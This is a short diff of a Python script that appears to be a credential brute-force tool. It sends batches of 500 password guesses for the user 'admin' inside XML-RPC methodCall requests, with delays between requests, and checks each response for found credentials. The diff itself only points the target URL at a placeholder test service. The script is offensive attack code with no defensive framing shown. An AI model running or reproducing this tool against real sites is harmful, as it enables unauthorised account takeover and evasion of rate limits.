@@ -4,7 +4,7 @@ import random
 
 user = "admin"
 payloads_per_request = 500
-target_url = ""
+target_url = "http://httpbin.org/post"
  
 # delay
 min_delay = 2
@@ -43,7 +43,7 @@ def main():
                         f'\n {insert}' +\
                     '</data></array></value></param></params></methodCall>'
 
-                response = requests.post('http://httpbin.org/post', data=xml, headers=headers)
+                response = requests.post(target_url, data=xml, headers=headers)
                 content = response.content.decode("utf-8")
                 print(response.status_code)
                 if found_credentials(content):
